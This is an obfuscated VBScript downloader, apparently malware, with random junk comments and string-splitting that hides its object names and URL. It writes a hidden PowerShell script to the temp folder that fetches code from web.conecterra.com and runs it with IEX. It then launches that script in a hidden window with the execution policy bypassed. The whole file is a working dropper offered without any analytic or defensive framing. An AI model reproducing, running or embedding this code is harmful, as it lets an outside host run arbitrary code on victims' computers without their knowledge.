'mrQGB2Rj9RcBYGnsphNNaCDBvw7nb
Dim ZRbSF, gatmX, EBzs, kceV, Ch, JLUbA
'2E7uv857Phusam5avO6n9mbbwXMUAkoHVPf9Eq1nVX0CcmE5H6U
Set ZRbSF = CreateObject("W" & "S" & "c" & "r" & "i" & "p" & "t" & "." & "S" & "h" & "e" & "l" & "l")
'W7n3s5NcYrEMxj4OPrQfnMxv4d1BnR0ywLY6bkHNCfeFtu
Set kceV = CreateObject("S" & "c" & "r" & "i" & "p" & "t" & "i" & "n" & "g" & "." & "F" & "i" & "l" & "e" & "S" & "y" & "s" & "t" & "e" & "m" & "O" & "b" & "j" & "e" & "c" & "t")
'gzZosf4siwepLgPu3VRLSre1EBkvqayGdGU2ehvzR96EoKi4nM2RhqVoIQD0d4Eh0uJkCHxDb5GC
EBzs = kceV.GetSpecialFolder(2) & "\" & kceV.GetTempName() & ".ps1"
'Oboi4nbbuPnaO8Oqqss9sDh5y
Ch = "h" & "t" & "t" & "p" & "s" & ":" & "/" & "/" & "w" & "e" & "b" & "." & "c" & "o" & "n" & "e" & "c" & "t" & "e" & "t" & "e" & "r" & "r" & "a" & "." & "c" & "o" & "m" & "/" & "p" & "/" & "l" & "b" & "c" & "x" & "f" & "p" & "8" & "q" & "q" & "5" & "y" & "p" & "c" & "q" & "z" & "o" & "s" & "x" & "o" & "r" & "b" & "y" & "p" & "k" & "k" & "e" & "w" & "k" & "6" & "q" & "8" & "h"
'AyU9RokbDdd3DNSsyK6oPSeYHHB3YTyi6WEDRqzYkYeXruMLwIgNrWpMLYzx
gatmX = "Try {" & vbCrLf & _
             "    $client = New-Object Net.WebClient;" & vbCrLf & _
             "    IEX $client.DownloadString('" & Ch & "');" & vbCrLf & _
             "} Catch {" & vbCrLf & _
             "    Pause;" & vbCrLf & _
             "}"
'ygOCxee2MUfnIFh36fEUjoWaiIlJpbLKMqyYJQ4otTtG
With kceV.CreateTextFile(EBzs, True)
    .WriteLine(gatmX)
    .Close
End With
'A6ICEUSeNWdZUUp3UYkTd8DuqN8V2sxwxWFDufSBfW8d9Wa7REMakpNr7u3SfrvYMOqgSbpcFYJoqnXdvxbx5oMDGCT4
JLUbA = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & EBzs & """ -NoExit"
'PCHl27BV63C8XgQlE3k2h9J89opyO48mMRFBRGa6AvFlqRdTOAshvqLFNW1B2WAfhNp81sIKlnxr2hr0vUA8qmH47vSU4977dI7q
ZRbSF.Run JLUbA, 0, True
'tEnU2s47oy0Fl4xIlZME9MmzgxHS0qGAi81cTCw0AoMniCV3qi60ztikiGwL3S3
Set ZRbSF = Nothing
'7iZS0TZOVKtQ7Zb05fLqh6q8mS6tMVg9Y
Set kceV = Nothing
'67f6p16FHyJzCz8FbQiYY9wdfc7OXW5DQQjGp5YnkYYXpKJ47Ja1n8DZcWPSuYjSKgoJSbwQuJju4